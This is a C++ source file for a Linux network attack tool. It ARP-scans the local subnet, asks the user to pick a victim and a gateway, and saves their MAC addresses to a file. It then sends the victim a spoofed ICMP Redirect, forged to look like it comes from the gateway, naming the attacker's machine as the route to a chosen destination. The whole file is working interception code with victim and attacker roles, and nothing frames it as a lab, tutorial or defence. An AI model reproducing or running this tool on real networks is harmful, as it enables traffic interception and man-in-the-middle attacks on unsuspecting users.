#include <arpa/inet.h>
#include <chrono>
#include <cstring>
#include <iomanip>
#include <fstream>
#include <ifaddrs.h>
#include <iostream>
#include <net/ethernet.h>
#include <net/if.h>
#include <netinet/ether.h>
#include <netinet/if_ether.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netpacket/packet.h>
#include <string>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>
#include <vector>

using std::string;
using std::vector;

struct Device { 
    string ip;
    string mac; 
};

string mac_to_str(const uint8_t *mac) {
    char buf[18];
    snprintf(buf, sizeof(buf), "%02x:%02x:%02x:%02x:%02x:%02x",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return buf;
}

string get_ip(const string &iface) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    struct ifreq ifr{};
    strncpy(ifr.ifr_name, iface.c_str(), IFNAMSIZ);
    ioctl(fd, SIOCGIFADDR, &ifr);
    close(fd);
    return inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
}

string get_mac(const string &iface) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    struct ifreq ifr{};
    strncpy(ifr.ifr_name, iface.c_str(), IFNAMSIZ);
    ioctl(fd, SIOCGIFHWADDR, &ifr);
    close(fd);
    return mac_to_str((uint8_t *)ifr.ifr_hwaddr.sa_data);
}
void split_ip(const string &ip, uint8_t bytes[4]) {
    sscanf(ip.c_str(), "%hhu.%hhu.%hhu.%hhu",
           &bytes[0], &bytes[1], &bytes[2], &bytes[3]);
}

uint16_t csum16(const void *buf, size_t len) {
    uint32_t sum = 0;
    const uint16_t *p = static_cast<const uint16_t *>(buf);
    while (len > 1) { sum += *p++; len -= 2; }
    if (len) sum += *reinterpret_cast<const uint8_t *>(p);
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    return static_cast<uint16_t>(~sum);
}

vector<Device> arp_scan(const string &iface,
                        const string &my_ip_str,
                        const string &my_mac_str) {
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock < 0) { perror("socket"); exit(1); }

    uint8_t my_mac[6];  sscanf(my_mac_str.c_str(),
        "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
        &my_mac[0], &my_mac[1], &my_mac[2],
        &my_mac[3], &my_mac[4], &my_mac[5]);

    uint8_t my_ip[4]; split_ip(my_ip_str, my_ip);

    struct ifreq ifr{}; strncpy(ifr.ifr_name, iface.c_str(), IFNAMSIZ);
    ioctl(sock, SIOCGIFINDEX, &ifr);

    sockaddr_ll sa{}; sa.sll_ifindex = ifr.ifr_ifindex;
    sa.sll_halen = ETH_ALEN; memcpy(sa.sll_addr, my_mac, 6);

    vector<Device> found;
    for (int i = 1; i <= 254; ++i) {
        if (i == my_ip[3]) continue;
        uint8_t tgt_ip[4] = {my_ip[0], my_ip[1], my_ip[2], static_cast<uint8_t>(i)};
        uint8_t pkt[42]{};                                   /* ARP Request */
        auto *eth = reinterpret_cast<ether_header *>(pkt);
        memset(eth->ether_dhost, 0xff, 6);
        memcpy(eth->ether_shost, my_mac, 6);
        eth->ether_type = htons(ETH_P_ARP);
        auto *arp = reinterpret_cast<ether_arp *>(pkt + 14);
        arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
        arp->ea_hdr.ar_pro = htons(ETH_P_IP);
        arp->ea_hdr.ar_hln = 6;  arp->ea_hdr.ar_pln = 4;
        arp->ea_hdr.ar_op  = htons(ARPOP_REQUEST);
        memcpy(arp->arp_sha, my_mac, 6);
        memcpy(arp->arp_spa, my_ip, 4);
        memcpy(arp->arp_tpa, tgt_ip, 4);
        sendto(sock, pkt, sizeof(pkt), 0,
               reinterpret_cast<sockaddr *>(&sa), sizeof(sa));
    }

    auto start = std::chrono::steady_clock::now();
    while (std::chrono::steady_clock::now() - start <
           std::chrono::seconds(2)) {
        uint8_t buf[65536];
        ssize_t len = recv(sock, buf, sizeof(buf), MSG_DONTWAIT);
        if (len < 0) continue;
        auto *eth = reinterpret_cast<ether_header *>(buf);
        if (ntohs(eth->ether_type) != ETH_P_ARP) continue;
        auto *arp = reinterpret_cast<ether_arp *>(buf + 14);
        if (ntohs(arp->ea_hdr.ar_op) != ARPOP_REPLY) continue;
        char ipstr[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, arp->arp_spa, ipstr, sizeof(ipstr));
        string mac = mac_to_str(arp->arp_sha);
        bool dup = false;
        for (auto &d: found) if (d.ip == ipstr) { dup = true; break; }
        if (!dup) found.push_back({ipstr, mac});
    }
    close(sock); return found;
}
void print_table(const vector<Device>& v){
    std::cout<<"index\tip address\t\tmac address\n";
    for (size_t i=0; i < v.size(); i++)
        std::cout<<i<<"\t"<<std::left<<std::setw(18)<<v[i].ip<<"\t"<<v[i].mac<<"\n";
}

void send_icmp_redirect(const string &iface,
                        const string &victim_ip,  const string &victim_mac,
                        const string &gw_ip,      const string &gw_mac,
                        const string &attacker_ip,
                        const string &redirect_dst){
    uint8_t vic_mac[6], gw_mac_b[6];
    uint8_t vic_ip[4],  gw_ip_b[4], atk_ip[4],  red_ip[4];
    sscanf(victim_mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &vic_mac[0],&vic_mac[1],&vic_mac[2],&vic_mac[3],&vic_mac[4],&vic_mac[5]);
    sscanf(gw_mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &gw_mac_b[0],&gw_mac_b[1],&gw_mac_b[2],&gw_mac_b[3],&gw_mac_b[4],&gw_mac_b[5]);
    inet_pton(AF_INET, victim_ip.c_str(),   vic_ip);
    inet_pton(AF_INET, gw_ip.c_str(),       gw_ip_b);
    inet_pton(AF_INET, attacker_ip.c_str(), atk_ip);
    inet_pton(AF_INET, redirect_dst.c_str(),red_ip);

    /* header */
    constexpr size_t ETH = 14, IP = 20, ICMP = 8, ORIG_IP = 20, DATA8 = 8;
    constexpr size_t PKT = ETH + IP + ICMP + ORIG_IP + DATA8;   // 70 B

    uint8_t pkt[PKT]{};  

    /* ethernet */
    auto *eth = reinterpret_cast<ether_header *>(pkt);
    memcpy(eth->ether_dhost, vic_mac, 6);
    memcpy(eth->ether_shost, gw_mac_b, 6);
    eth->ether_type = htons(ETH_P_IP);

    /* ip */
    auto *ip = reinterpret_cast<iphdr *>(pkt + ETH);
    ip->ihl = 5; ip->version = 4;
    ip->tot_len = htons(IP + ICMP + ORIG_IP + DATA8); // 56
    ip->ttl = 255; ip->protocol = IPPROTO_ICMP;
    memcpy(&ip->saddr, gw_ip_b, 4);
    memcpy(&ip->daddr, vic_ip, 4);
    ip->check = csum16(ip, IP);

    /* icmp redirect */
    auto *icmp = reinterpret_cast<icmphdr *>(pkt + ETH + IP);
    icmp->type = ICMP_REDIRECT; icmp->code = 0;
    memcpy(&icmp->un.gateway, atk_ip, 4);

    /* embedded ip header */
    auto *orig = reinterpret_cast<iphdr *>(pkt + ETH + IP + ICMP);
    orig->ihl = 5; orig->version = 4;
    orig->tot_len = htons(ORIG_IP + DATA8);
    orig->protocol = IPPROTO_ICMP; orig->ttl = 64;
    memcpy(&orig->saddr, vic_ip, 4);
    memcpy(&orig->daddr, red_ip, 4);
    orig->check = csum16(orig, ORIG_IP);

    uint8_t *d8 = pkt + ETH + IP + ICMP + ORIG_IP;
    d8[0]=0x00; d8[1]=0x00;       // Echo-reply Type/Code
    d8[2]=0xFF; d8[3]=0xFF;       // checksum=0xFFFF
    /* Identifier/Seq = 0 (d8[4-7] already 0) */

    icmp->checksum = csum16(icmp, ICMP + ORIG_IP + DATA8);

    int sd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sd < 0) { perror("socket"); return; }

    struct ifreq ifr{}; strncpy(ifr.ifr_name, iface.c_str(), IFNAMSIZ);
    if (ioctl(sd, SIOCGIFINDEX, &ifr) != 0) { perror("ioctl"); close(sd); return; }

    sockaddr_ll dst{}; dst.sll_family = AF_PACKET;
    dst.sll_ifindex = ifr.ifr_ifindex; dst.sll_halen = ETH_ALEN;
    memcpy(dst.sll_addr, vic_mac, 6);

    if (sendto(sd, pkt, PKT, 0,
               reinterpret_cast<sockaddr*>(&dst), sizeof(dst)) < 0)
        perror("sendto");
    else
        std::cout << "[+] ICMP Redirect sent, "
                  << attacker_ip << " as gateway for " << redirect_dst << "\n";
    close(sd);
}

int main(int argc, char *argv[]){
    if (argc != 3) {
        std::cout << "Usage: " << argv[0] << " <redirect_target_ip> <interface>\n";
        return 1;
    }
    string target_ip = argv[1], iface = argv[2];
    string my_ip  = get_ip(iface);
    string my_mac = get_mac(iface);

    std::cout << "[*] my ip: " << my_ip  << "\n"
              << "[*] my mac: " << my_mac << "\n";

    std::cout << "[*] ARP scanning...\n";
    auto devs = arp_scan(iface, my_ip, my_mac);
    print_table(devs);

    size_t vic, gw;
    std::cout << "Victim index: ";  std::cin >> vic;
    std::cout << "Gateway index: "; std::cin >> gw;
    std::ofstream outfile("a.txt");
    if (outfile.is_open()) {
        outfile << devs[vic].mac << "\n";
        outfile << devs[gw].mac  << "\n";
        outfile << iface << "\n";
        outfile.close();
    } else {
        std::cerr << "[!] Failed to open a.txt for writing.\n";
    }

    send_icmp_redirect(iface,
                       devs[vic].ip,  devs[vic].mac,
                       devs[gw].ip,   devs[gw].mac,
                       my_ip,         target_ip);
    return 0;
}
